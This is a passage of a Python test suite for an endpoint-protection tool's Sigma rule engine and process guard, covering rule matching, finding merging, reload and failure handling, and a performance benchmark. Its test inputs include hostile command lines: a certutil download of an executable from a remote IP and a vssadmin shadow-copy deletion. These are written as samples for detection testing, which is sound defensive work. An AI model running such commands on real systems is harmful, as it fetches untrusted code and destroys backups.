    assert len(findings) == 1  # the command-line rules and the Sigma rule agree: one alert, not two
    f = findings[0]
    assert f.title == "Sigma: Shadow Copies or Backups Deleted" or f.evidence["sigma_rules"][0]["title"] == "Shadow Copies or Backups Deleted"
    assert f.severity >= Severity.HIGH and "T1490" in f.mitre


def test_process_guard_sigma_ignores_other_platforms_and_low_findings(cfg, monkeypatch):
    pg, _, _ = sigma_only_guard(cfg, monkeypatch)
    bad = pinfo(cmdline=["certutil.exe", "-urlcache", "-f", "http://203.0.113.5/a.exe", "a.exe"], exe=r"C:\Windows\System32\certutil.exe",
                name="certutil.exe")
    assert [f.title for f in pg.evaluate(bad)] == ["Sigma: Certutil Used to Download a File"]
    monkeypatch.setattr(M, "IS_WINDOWS", False)  # a Linux host runs no Windows rules
    assert pg.evaluate(bad) == []
    monkeypatch.setattr(M, "IS_WINDOWS", True)
    low = make_rule(sel(Image="x"), level="low", id="40000000-0000-0000-0000-000000000001")
    pg2, _, _ = sigma_only_guard(cfg, monkeypatch, S.SigmaRuleSet([low]))
    assert pg2.evaluate(pinfo(exe="x", name="x", cmdline=["x"])) == []  # below MEDIUM: not worth interrupting the user


def test_process_guard_sigma_never_auto_kills_and_folds_into_native_findings(cfg, monkeypatch):
    crit = make_rule({"s": {"Image|endswith": "\\evil.exe"}, "condition": "s"}, level="critical", id="40000000-0000-0000-0000-000000000002",
                     tags=["attack.t1059"], title="Critical behaviour")
    cfg.realtime_kill_malicious_processes = True
    pg, _, _ = make_guard(cfg, monkeypatch, sigma_rules=S.SigmaRuleSet([crit]))
    info = pinfo(exe=r"C:\Users\bob\evil.exe", name="evil.exe", cmdline=["evil.exe"])
    (f,) = pg.evaluate(info)
    assert f.severity == Severity.HIGH and f.evidence["sigma_level"] == "critical"  # capped below CRITICAL
    assert not pg.should_kill(info, [f])  # a behaviour rule alone never terminates a process

    # same technique as a native command-line finding -> one finding, Sigma folded in
    def analyse(cmd):
        return [("AEG-CMD-NATIVE", "Native finding", Severity.MEDIUM, ["T1059.001"], "x")]

    enc = make_rule({"s": {"Image|endswith": "\\powershell.exe"}, "condition": "s"}, level="high", id="40000000-0000-0000-0000-000000000003",
                    tags=["attack.t1059.001"], title="Sigma PS")
    pg, _, _ = make_guard(cfg, monkeypatch, sigma_rules=S.SigmaRuleSet([enc]), analyse_fn=analyse)
    out = pg.evaluate(pinfo())
    assert [x.rule_id for x in out] == ["AEG-CMD-NATIVE"]
    assert out[0].severity == Severity.HIGH and out[0].evidence["sigma_rules"][0]["title"] == "Sigma PS"
    assert out[0].remediation.action == "kill_process"  # the native finding keeps its own remediation

    # a different technique stays a separate finding
    other = make_rule({"s": {"Image|endswith": "\\powershell.exe"}, "condition": "s"}, level="high", id="40000000-0000-0000-0000-000000000004",
                      tags=["attack.t1003.001"], title="Different")
    pg, _, _ = make_guard(cfg, monkeypatch, sigma_rules=S.SigmaRuleSet([other]), analyse_fn=analyse)
    assert sorted(x.rule_id for x in pg.evaluate(pinfo())) == ["AEG-CMD-NATIVE", "SIGMA-40000000"]


def test_process_guard_injected_analysis_without_sigma_rules_is_untouched(cfg, monkeypatch):
    pg, _, _ = make_guard(cfg, monkeypatch, analyse_fn=lambda cmd: [])
    bad = pinfo(cmdline=["vssadmin.exe", "delete", "shadows", "/all"], exe=r"C:\Windows\System32\vssadmin.exe", name="vssadmin.exe")
    assert pg.evaluate(bad) == []  # tests that inject analysis functions see exactly what they injected
    assert pg._sigma is None


def test_process_guard_lazy_load_reload_and_failure_modes(cfg, monkeypatch, tmp_path):
    pg, _, _ = make_guard(cfg, monkeypatch)
    assert pg._sigma is None  # nothing is loaded at construction
    rules = pg._sigma_ruleset()
    assert rules and rules.available and all(r.category == "process_creation" for r in rules.rules)
    assert pg._sigma_ruleset() is rules  # cached

    # a new rule file appears (e.g. after `aegis update`): picked up once the check interval has passed
    custom = Path(cfg.signatures_dir).parent / "signatures" / "sigma_custom"
    custom.mkdir(parents=True, exist_ok=True)
    (custom / "mine.yml").write_text(rule_yaml("  s:\n    Image|endswith: '\\mine.exe'\n  condition: s", "Mine",
                                               "50000000-0000-0000-0000-000000000000"))
    assert pg._sigma_ruleset() is rules  # not re-checked yet
    pg._sigma_checked = time.monotonic() - M.SIGMA_RELOAD_S - 1
    reloaded = pg._sigma_ruleset()
    assert reloaded is not rules and reloaded.get("50000000-0000-0000-0000-000000000000") is not None
    pg._sigma_checked = time.monotonic() - M.SIGMA_RELOAD_S - 1
    assert pg._sigma_ruleset() is reloaded  # unchanged files: no reload

    # PyYAML missing: no rules, processes are evaluated as before, and the load is not retried every poll
    pg2, _, _ = make_guard(cfg, monkeypatch)
    monkeypatch.setattr(S, "_yaml", lambda: None)
    assert pg2._sigma_ruleset() is None and pg2.evaluate(pinfo()) == [] and pg2._sigma is False
    calls = {"n": 0}
    real = S.load_rules

    def counting(*a, **k):
        calls["n"] += 1
        return real(*a, **k)

    monkeypatch.setattr(S, "load_rules", counting)
    pg2._sigma_ruleset()
    pg2._sigma_ruleset()
    assert calls["n"] == 0  # still inside the retry window

    # a crashing loader never reaches the caller
    pg3, _, _ = make_guard(cfg, monkeypatch)
    monkeypatch.setattr(S, "load_rules", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    assert pg3._sigma_ruleset() is None and pg3.evaluate(pinfo()) == []


# =========================================================================== optional module

def test_integrations_work_without_the_sigma_module(monkeypatch, ctx, cfg, no_sigma_module):
    with pytest.raises(ImportError):
        from aegis.core import sigma  # noqa: F401  (the fixture really removed it)
    # eventlog helpers degrade to "no Sigma"
    found, info = el.sigma_hunt({"security": [E(1102, "Security", 0)]})
    assert found == [] and info["status"] == "unavailable" and "Sigma" in info["detail"]
    native = el.detect_log_cleared([E(1102, "Security", 0)])
    assert el.merge_sigma_findings(native, []) == native
    out = run_scanner(monkeypatch, ctx, {"security": [E(1102, "Security", 0)]})
    assert sigma_check(out).status == CheckStatus.SKIP
    assert [f.rule_id for f in out if isinstance(f, Finding) and f.rule_id == "AEG-EVT-CLEARED"] == ["AEG-EVT-CLEARED"]
    # the process guard keeps working with its own analysis
    pg, _, _ = make_guard(cfg, monkeypatch, scan_fn=None)  # nothing injected: the real Sigma hook path runs
    bad = pinfo(cmdline=["vssadmin.exe", "delete", "shadows", "/all", "/quiet"], exe=r"C:\Windows\System32\vssadmin.exe", name="vssadmin.exe")
    findings = pg.evaluate(bad)
    assert findings and all(not f.rule_id.startswith("SIGMA-") for f in findings) and pg._sigma is False
    assert pg._with_sigma(bad, ["x"]) == ["x"]


def test_process_guard_sigma_hook_swallows_engine_errors(cfg, monkeypatch):
    class Exploding:
        signature = ""

        def __bool__(self):
            return True

        def match(self, event):
            raise RuntimeError("engine bug")

    pg, _, _ = make_guard(cfg, monkeypatch, sigma_rules=Exploding(), analyse_fn=lambda cmd: [])
    assert pg.evaluate(pinfo()) == []  # the failure is logged at debug level, the process is simply not flagged


# =========================================================================== performance

def synthetic_rules(n=3000):
    """Rules shaped like the SigmaHQ Windows set (several selections, filters, modifiers, every logsource)."""
    out = []
    for i in range(n):
        k = i % 10
        if k < 6:
            det = {"selection_img": {"Image|endswith": [f"\\tool{i}.exe", f"\\alt{i}.exe"]},
                   "selection_cli": {"CommandLine|contains|all": [f" -flag{i} ", f"payload{i}"]},
                   "filter_parent": {"ParentImage|endswith": f"\\good{i % 7}.exe"}}
            if i % 20 == 0:
                det["selection_cli"] = {"CommandLine|re": rf"(?i)\s-opt{i}\s+[a-z0-9]{{12,}}"}
            if i % 15 == 0:
                det["selection_cli"] = {"CommandLine|contains|windash": f" -switch{i} "}
            cond = "selection_img and selection_cli and not filter_parent" if i % 3 else "1 of selection_* and not 1 of filter_*"
            ls = {"category": "process_creation", "product": "windows"}
        elif k == 6:
            det = {"selection": {"TargetObject|contains": f"\\Run\\key{i}", "Details|startswith": "C:\\Users\\"}}
            cond, ls = "selection", {"category": "registry_set", "product": "windows"}
        elif k == 7:
            det = {"selection": {"TargetFilename|endswith": [f".ext{i}", f".bad{i}"], "Image|contains": f"dropper{i}"}}
            cond, ls = "selection", {"category": "file_event", "product": "windows"}
        elif k == 8:
            det = {"keywords": [f"Invoke-Thing{i}", f"BadFunc{i}*"]}
            cond, ls = "keywords", {"category": "ps_script", "product": "windows"}
        else:
            det = {"selection": {"EventID": 4688 + (i % 50)}, "selection_name": {"SubjectUserName|startswith": f"svc{i}"},
                   "filter": {"DestinationIp|cidr": ["10.0.0.0/8", "192.168.0.0/16"]}}
            cond, ls = "selection and selection_name and not filter", {"service": "security", "product": "windows"}
        det["condition"] = cond
        out.append(S.rule_from_dict({"title": f"Synthetic {i}", "id": f"{i:08x}-0000-0000-0000-000000000000", "status": "test",
                                     "level": "high", "logsource": ls, "detection": det}))
    return out


def synthetic_events(n=1000):
    events = []
    for i in range(n):
        k = i % 10
        if k < 6:
            events.append(pc(Image=rf"C:\Windows\System32\proc{i % 40}.exe", CommandLine="C:\\Program Files\\App\\x.exe --type=renderer " + "arg " * (i % 60),
                             ParentImage=r"C:\Windows\explorer.exe", User="PC\\bob", IntegrityLevel="Medium"))
        elif k == 6:
            events.append({"_category": "registry_set", "Image": r"C:\x.exe", "TargetObject": rf"HKU\S-1\Software\Foo\Bar{i}", "Details": "DWORD (0x00000001)"})
        elif k == 7:
            events.append({"_category": "file_event", "Image": r"C:\x.exe", "TargetFilename": rf"C:\Users\bob\AppData\Local\Temp\f{i}.tmp"})
        elif k == 8:
            events.append({"_category": "ps_script", "ScriptBlockText": "Get-ChildItem | Where-Object { $_.Length -gt 1 } " * 20})
        else:
            events.append({"_service": "security", "EventID": "4688", "SubjectUserName": "bob", "Provider_Name": "x"})
    return events


def test_benchmark_3000_rules_x_1000_events():
    t0 = time.perf_counter()
    rules = synthetic_rules(3000)
    rs = S.SigmaRuleSet(rules)
    compile_s = time.perf_counter() - t0
    events = synthetic_events(1000)
    planted = [  # events that must fire specific synthetic rules
        (pc(Image=r"C:\x\tool5.exe", CommandLine="tool5.exe -flag5 payload5", ParentImage=r"C:\x\other.exe"), "Synthetic 5"),
        (pc(Image=r"C:\x\alt11.exe", CommandLine="a -flag11 payload11", ParentImage=r"C:\x\zzz.exe"), "Synthetic 11"),
        (pc(Image=r"C:\x\tool20.exe", CommandLine="tool20.exe -opt20 abcdef123456xyz", ParentImage=r"C:\x\zzz.exe"), "Synthetic 20"),
        (pc(Image=r"C:\x\tool30.exe", CommandLine="tool30.exe /switch30 now", ParentImage=r"C:\x\zzz.exe"), "Synthetic 30"),
        ({"_category": "registry_set", "TargetObject": r"HKLM\Run\key6", "Details": r"C:\Users\bob\x.exe"}, "Synthetic 6"),
        ({"_category": "file_event", "TargetFilename": r"C:\a.bad7", "Image": r"C:\dropper7.exe"}, "Synthetic 7"),
        ({"_category": "ps_script", "ScriptBlockText": "x BadFunc8 and more"}, "Synthetic 8"),
        ({"_service": "security", "EventID": "4697", "SubjectUserName": "svc9"}, "Synthetic 9"),
    ]
    events += [e for e, _ in planted]
    t1 = time.perf_counter()
    run = S.evaluate(events, rs)
    eval_s = time.perf_counter() - t1
    print(f"\nsigma benchmark: {len(rules)} rules compiled in {compile_s:.2f}s; {len(events)} events evaluated in {eval_s:.2f}s "
          f"({len(events) * len(rules) / max(eval_s, 1e-9):,.0f} rule-event pairs/s nominal)")
    got = {m.rule.title for m in run.matches}
    assert {title for _, title in planted} <= got
    assert len(run.matches) < 40 and not run.truncated and run.evaluated == len(events)
    assert eval_s < 30, f"evaluation took {eval_s:.1f}s"  # generous bound: typically well under 5s
    assert compile_s < 30
